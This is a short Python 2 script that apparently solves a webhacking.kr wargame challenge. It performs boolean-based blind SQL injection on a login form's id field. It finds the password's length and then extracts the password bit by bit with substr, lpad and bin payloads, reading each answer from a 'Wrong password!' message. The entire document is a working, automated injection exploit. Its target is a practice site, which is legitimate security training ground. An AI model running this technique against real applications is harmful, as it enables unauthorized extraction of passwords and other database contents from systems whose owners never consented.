# data ='id=admin%27+%23&pw=admin%27+%23'
import requests

url = 'http://webhacking.kr/challenge/bonus/bonus-2/index.php'

r = requests.session()
headers = {"Cookie": "PHPSESSID="}
keyword = 'Wrong password!'
payload_basic = 'admin\' and '


def bin2dec(num):
    return int(str(num), 2)


def injection(rawdata, keyword):
    try:
        payload = {'id': rawdata, 'pw': ''}
        result = r.post(url, data=payload, headers=headers)
        # print result.content
        return keyword in result.content
    except Exception as e:
        print '**', e
        return -1


def QueryLength():
    length = 1

    while True:
        payload = payload_basic + \
            "(length(pw)= " + str(length) + ") limit 0,1 #"
        # print payload
        if injection(payload, keyword):
            return length
            # break
        length += 1
        print length
        # time.sleep(1)

    print 'Error. QueryLength Failed!'
    return -1


def QueryFlag():

    pw = ''
    length = QueryLength()
    print 'length: ', length

    for i in range(length):
        pw_bin = ''
        for digit in range(8):
            payload = payload_basic + '(substr(lpad(bin(ord(substr(pw,%d,1))),8,0),%d,1)=0) limit 0,1 #' % (
                i + 1, digit + 1)
            if injection(payload, keyword):
                pw_bin += '0'
            else:
                pw_bin += '1'
            print pw_bin
        pw += chr(bin2dec(pw_bin))
        print pw
        # time.sleep(1)

    return pw

if __name__ == "__main__":
    print QueryFlag()
